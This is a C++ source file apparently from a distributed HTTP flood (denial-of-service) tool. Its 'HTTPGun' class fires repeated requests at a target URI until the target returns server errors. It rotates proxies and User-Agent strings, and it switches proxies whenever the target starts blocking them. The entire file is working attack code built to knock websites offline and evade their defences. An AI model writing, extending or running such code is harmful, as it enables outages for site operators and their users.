#include "spdlog/spdlog.h"

#include "http_gun.h"

#include "api_interface.h"
#include "target.hpp"
#include "utils.h"
#include "config.h"

using namespace Attackers;

std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};

	SPDLOG_INFO("Probing proxies with {}", ProxyConfig::PROXY_PROBING);
	prober.SetTarget(ProxyConfig::PROXY_PROBING);
	for(auto proxy : proxies)
	{
		prober.SetProxy(proxy.first, proxy.second);
		UpdateHeaders(headers, proxy.first);
		prober.SetHeaders(headers);

		if(const auto respCode{prober.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(*respCode >= 200 && *respCode < 300)
			{
				return proxy;
			}
			SPDLOG_INFO("Proxy: {}@{} failed with code: {}", proxy.first, proxy.second, *respCode);
		}
		else
		{
			SPDLOG_INFO("Proxy: {}@{} failed", proxy.first, proxy.second);
		}
	}

	return {};
}

bool HTTPGun::SetValidProxy() noexcept
{
	Informator informer;
	size_t proxyTries{0};

	while(!m_currentTask.ShouldStop())
	{
		if(!informer.LoadNewData())
		{
			continue;
		}
		if(const auto proxies{informer.GetProxies()})
		{
			if(const auto proxy{ChoseProxy(*proxies)})
			{
				m_currentProxy = std::move(proxy);
				return true;
			}
			else
			{
				++proxyTries;
			}
		}
		if(proxyTries == ProxyConfig::PROXY_TRIES)
		{
			SPDLOG_WARN("Max proxy fetch tries reached, aborting");
			break;
		}
	}
	return false;
}

std::size_t HTTPGun::FireTillDead(const CURI &targetToKill) noexcept
{
	std::size_t hits{0};

	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
	if(AttackWithNoProxy(targetToKill, hits))
	{
		return hits;
	}

	SPDLOG_INFO("Attacking {} with proxy", targetToKill);
	AttackWithProxy(targetToKill, hits);

	return hits;
}

bool HTTPGun::AttackWithNoProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
{
	Headers headers{CURLLoader::BASE_HEADERS};
	CURLLoader wrapper;

	size_t errorsCount{0};

	wrapper.SetTarget(targetToKill.GetFullURI());

	while(!m_currentTask.ShouldStop())
	{
		headers["User-Agent"] = ChoseUseragent();
		wrapper.SetHeaders(headers);

		if(const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(!respCode &&
				++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				SPDLOG_WARN("Too many errors emited on no proxy attack, retrying");
				return true;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				SPDLOG_WARN("Target {} is blocking non proxy requests, leaving", targetToKill);
				break;
			}
			else if(*respCode >= 500)
			{
				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill);
				return true;
			}
			else
			{
				++hitsCount;
			}
		}
	}

	return false;
}

void HTTPGun::AttackWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
{
	CURLLoader wrapper;
	Informator apiLoader;
	Headers headers{CURLLoader::BASE_HEADERS};

	wrapper.SetTarget(targetToKill.GetFullURI());

	while(!m_currentTask.ShouldStop())
	{
		// Setting proxies
		if(!SetValidProxy())
		{
			return;
		}

		// Attacking
		size_t errorsCount{0};
		size_t currentTry{0}; 
		while(currentTry++ < ProxyConfig::MAX_PROXY_ATTACKS &&
			!m_currentTask.ShouldStop())
		{
			UpdateHeaders(headers, m_currentProxy->first);
			wrapper.SetHeaders(headers);

			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
			if(!respCode &&
				++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
				return;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				SPDLOG_INFO("Target {} is blocking current proxy, trying other", targetToKill);
				break;
			}
			else if(*respCode >= 500)
			{
				SPDLOG_INFO("Target: {} is down, looking for others", targetToKill);
				return;
			}
			else
			{
				++hitsCount;
			}
		}
		SPDLOG_WARN("Current proxy exhausted, looking for other");
	}
}
